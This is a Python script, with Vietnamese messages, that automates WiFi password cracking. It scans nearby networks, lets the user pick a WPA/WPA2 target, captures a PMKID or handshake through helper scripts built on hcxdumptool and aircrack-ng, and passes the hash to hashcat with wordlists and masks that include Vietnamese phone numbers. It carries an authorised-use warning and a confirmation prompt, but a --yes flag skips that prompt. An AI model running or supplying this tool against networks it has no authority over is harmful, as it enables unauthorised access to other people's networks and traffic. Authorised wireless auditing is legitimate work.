#!/usr/bin/env python3
"""Quét WiFi xung quanh, chọn mục tiêu, capture PMKID/handshake rồi crack tự động.

Chỉ dùng cho mạng bạn sở hữu hoặc có uỷ quyền bằng văn bản.

Chạy: sudo python3 audit.py
"""

import argparse
import os
import shutil
import subprocess
import sys
from pathlib import Path

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)
    sys.stderr.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)

ROOT = Path(__file__).resolve().parent
CAPTURES = ROOT / "captures"
SCAN_FIELDS = ("IN-USE", "BSSID", "SSID", "CHAN", "FREQ", "SIGNAL", "SECURITY")
REQUIRED_TOOLS = {
    "nmcli": "networkmanager",
    "iw": "iw",
    "hcxdumptool": "hcxdumptool",
    "hcxpcapngtool": "hcxtools",
    "aircrack-ng": "aircrack-ng",
    "aireplay-ng": "aircrack-ng",
    "hashcat": "hashcat",
}


def split_escaped(line):
    fields, current, escaped = [], [], False
    for ch in line:
        if escaped:
            current.append(ch)
            escaped = False
        elif ch == "\\":
            escaped = True
        elif ch == ":":
            fields.append("".join(current))
            current = []
        else:
            current.append(ch)
    if escaped:
        current.append("\\")
    fields.append("".join(current))
    return fields


def check_tools():
    missing = {}
    for tool, package in REQUIRED_TOOLS.items():
        if not shutil.which(tool):
            missing.setdefault(package, []).append(tool)
    if missing:
        for package, tools in sorted(missing.items()):
            print(f"[x] thiếu {', '.join(tools)} — cài: sudo pacman -S {package}")
        sys.exit(1)


def detect_iface():
    result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
    current = None
    for raw in result.stdout.splitlines():
        line = raw.strip()
        if line.startswith("Interface "):
            current = line.split(maxsplit=1)[1]
        elif line.startswith("Unnamed"):
            current = None
        elif line.startswith("type ") and current:
            if line == "type managed":
                return current
            current = None
    return None


def scan():
    cmd = [
        "nmcli", "-t", "-f", ",".join(SCAN_FIELDS),
        "dev", "wifi", "list", "--rescan", "yes",
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        sys.exit(f"[x] quét WiFi thất bại: {result.stderr.strip() or 'nmcli lỗi'}")
    aps, seen = [], set()
    for line in result.stdout.splitlines():
        fields = split_escaped(line)
        if len(fields) != len(SCAN_FIELDS):
            continue
        in_use, bssid, ssid, chan, freq, signal, security = fields
        mac = bssid.strip().lower()
        if mac.count(":") != 5:
            continue
        if (mac, chan) in seen:
            continue
        seen.add((mac, chan))
        try:
            strength = int(signal.strip())
        except ValueError:
            strength = 0
        try:
            mhz = int(freq.split()[0])
        except (ValueError, IndexError):
            mhz = 0
        if 2400 <= mhz < 2500:
            band = "2.4"
        elif 5000 <= mhz < 5925:
            band = "5"
        elif mhz >= 5925:
            band = "6"
        else:
            band = "?"
        aps.append({
            "in_use": bool(in_use.strip()),
            "bssid": mac,
            "ssid": ssid or "<ẩn>",
            "chan": chan,
            "band": band,
            "signal": strength,
            "security": security.strip() or "OPEN",
        })
    aps.sort(key=lambda ap: (-ap["signal"], ap["ssid"].lower()))
    return aps


def display(aps):
    print(f"\n{'STT':>3}  {'':2} {'SSID':<28} {'BSSID':<17} {'KÊNH':>4} {'BAND':>4} {'SIGNAL':>6}  BẢO MẬT")
    print("-" * 94)
    for index, ap in enumerate(aps, 1):
        mark = "*" if ap["in_use"] else " "
        print(
            f"{index:>3}  {mark:2} {ap['ssid'][:28]:<28} {ap['bssid']:<17} "
            f"{ap['chan']:>4} {ap['band']:>4} {ap['signal']:>5}%  {ap['security']}"
        )
    print("-" * 94)
    print("(* = mạng máy đang kết nối)")


def choose(aps):
    display(aps)
    while True:
        try:
            choice = input("\nChọn STT mục tiêu (r = quét lại, q = thoát): ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            sys.exit("\n[*] huỷ")
        if choice in ("q", "quit"):
            sys.exit("[*] thoát")
        if choice == "r":
            aps = scan()
            if not aps:
                sys.exit("[x] không quét được mạng nào")
            display(aps)
            continue
        if not choice.isdigit() or not 1 <= int(choice) <= len(aps):
            print("[!] STT không hợp lệ")
            continue
        ap = aps[int(choice) - 1]
        security = ap["security"].upper()
        if "WEP" in security or security in ("", "OPEN"):
            print("[!] chỉ hỗ trợ WPA/WPA2 — mạng này mở hoặc dùng WEP.")
            continue
        if "802.1X" in security:
            print("[!] mạng WPA-Enterprise (802.1X) — không crack được bằng mode 22000.")
            continue
        if "WPA3" in security and "WPA2" not in security:
            print("[!] mạng WPA3-only (SAE) — không crack được bằng mode 22000.")
            continue
        return ap


def snapshot_hashes():
    return {path for path in CAPTURES.glob("*.hc22000") if not path.name.endswith("-target.hc22000")}


def new_hash(before):
    candidates = [
        path for path in CAPTURES.glob("*.hc22000")
        if path not in before
        and not path.name.endswith("-target.hc22000")
        and path.stat().st_size > 0
    ]
    if not candidates:
        return None
    return max(candidates, key=lambda path: path.stat().st_mtime)


def filter_hash(hashfile, bssid):
    if hashfile is None:
        return None
    target = bssid.replace(":", "").lower()
    kept = []
    for line in hashfile.read_text(encoding="utf-8", errors="replace").splitlines():
        parts = line.split("*")
        if len(parts) > 3 and parts[0] == "WPA" and parts[3].lower() == target:
            kept.append(line)
    if not kept:
        return None
    output = hashfile.with_name(f"{hashfile.stem}-target.hc22000")
    output.write_text("\n".join(kept) + "\n", encoding="utf-8", newline="\n")
    return output


def capture(ap, iface, pmkid_minutes, hs_seconds):
    CAPTURES.mkdir(exist_ok=True)
    print(f"\n[*] mục tiêu: {ap['ssid']} | {ap['bssid']} | kênh {ap['chan']}")
    print("[!] WiFi của máy sẽ ngắt tạm thời trong lúc capture, tự bật lại sau.")
    before = snapshot_hashes()

    print("\n[1/2] thử PMKID (không cần client đang kết nối)...")
    subprocess.run(
        ["bash", str(ROOT / "capture" / "pmkid.sh"), iface, str(pmkid_minutes), ap["chan"]],
        cwd=ROOT,
        check=False,
    )
    raw = new_hash(before)
    target = filter_hash(raw, ap["bssid"])
    if target:
        return target, raw

    print("\n[2/2] chưa có PMKID đúng mục tiêu — bắt handshake (cần client reconnect)...")
    subprocess.run(
        [
            "bash", str(ROOT / "capture" / "handshake.sh"),
            iface, ap["bssid"], ap["chan"], "", str(hs_seconds),
        ],
        cwd=ROOT,
        check=False,
    )
    raw = new_hash(before) or raw
    target = filter_hash(raw, ap["bssid"])
    return target, raw


def restore_network():
    if not shutil.which("systemctl"):
        return
    status = subprocess.run(
        ["systemctl", "is-active", "NetworkManager"],
        capture_output=True,
        text=True,
    )
    if status.stdout.strip() != "active":
        print("[*] bật lại NetworkManager")
        subprocess.run(["systemctl", "start", "NetworkManager"], check=False)


def return_ownership():
    if os.geteuid() != 0:
        return
    uid, gid = os.environ.get("SUDO_UID"), os.environ.get("SUDO_GID")
    if not uid or not gid:
        return
    targets = [CAPTURES, ROOT / "cracked.potfile"]
    for target in targets:
        if not target.exists():
            continue
        paths = [target, *target.rglob("*")] if target.is_dir() else [target]
        for path in paths:
            try:
                os.chown(path, int(uid), int(gid))
            except OSError:
                pass


def crack(hashfile, args):
    cmd = [sys.executable, str(ROOT / "crack.py"), str(hashfile)]
    if args.wordlist:
        cmd += ["--wordlist", args.wordlist]
    if args.mask_lens:
        cmd += ["--mask-lens", args.mask_lens]
    if args.phone:
        cmd.append("--phone")
    if args.deep:
        cmd.append("--deep")
    print(f"\n[*] crack {hashfile.name}")
    subprocess.run(cmd, cwd=ROOT, check=False)


def main():
    parser = argparse.ArgumentParser(
        description="Quét WiFi, chọn mục tiêu, capture và crack tự động (chỉ mạng của bạn).",
    )
    parser.add_argument("--iface", help="card WiFi (mặc định: tự dò)")
    parser.add_argument("--pmkid-minutes", type=int, default=5, help="thời gian thử PMKID, phút (mặc định: 5)")
    parser.add_argument("--hs-seconds", type=int, default=60, help="thời gian tối đa bắt handshake, giây (mặc định: 60)")
    parser.add_argument("--wordlist", help="wordlist tuỳ chỉnh cho bước crack")
    parser.add_argument("--mask-lens", default="8", help="độ dài mask số cho bước crack (mặc định: 8)")
    parser.add_argument("--phone", action="store_true", help="thêm mask số điện thoại VN")
    parser.add_argument("--deep", action="store_true", help="thêm rockyou+best66 và hybrid (lâu)")
    parser.add_argument("--yes", action="store_true", help="bỏ qua xác nhận quyền sở hữu mạng")
    args = parser.parse_args()

    if os.geteuid() != 0:
        sys.exit("[x] cần quyền root để quét/capture: sudo python3 audit.py")

    check_tools()

    iface = args.iface or detect_iface()
    if not iface:
        sys.exit("[x] không thấy card WiFi managed — kiểm tra `iw dev` hoặc dùng --iface")

    print(f"[*] card WiFi: {iface}")
    print("[!] chỉ dùng cho mạng bạn sở hữu hoặc có uỷ quyền bằng văn bản.")
    aps = scan()
    if not aps:
        sys.exit("[x] không quét được mạng nào")
    ap = choose(aps)

    if not args.yes:
        try:
            answer = input(
                f"[?] Xác nhận '{ap['ssid']}' ({ap['bssid']}) thuộc quyền sở hữu/uỷ quyền của bạn [y/N]: "
            ).strip().lower()
        except (EOFError, KeyboardInterrupt):
            sys.exit("\n[*] huỷ")
        if answer not in ("y", "yes", "có", "co"):
            sys.exit("[*] huỷ")

    try:
        hashfile, raw = capture(ap, iface, args.pmkid_minutes, args.hs_seconds)
    finally:
        restore_network()
        return_ownership()

    if not hashfile:
        if raw:
            print(f"\n[-] file {raw.name} không chứa hash của {ap['bssid']} — không crack để tránh đụng mạng khác.")
            print(f"    File giữ lại để kiểm tra: {raw}")
        else:
            print("\n[-] không bắt được PMKID/handshake. Gợi ý: đứng gần AP hơn, thử kênh khác, hoặc chờ client reconnect.")
        return

    try:
        crack(hashfile, args)
    finally:
        return_ownership()


if __name__ == "__main__":
    main()
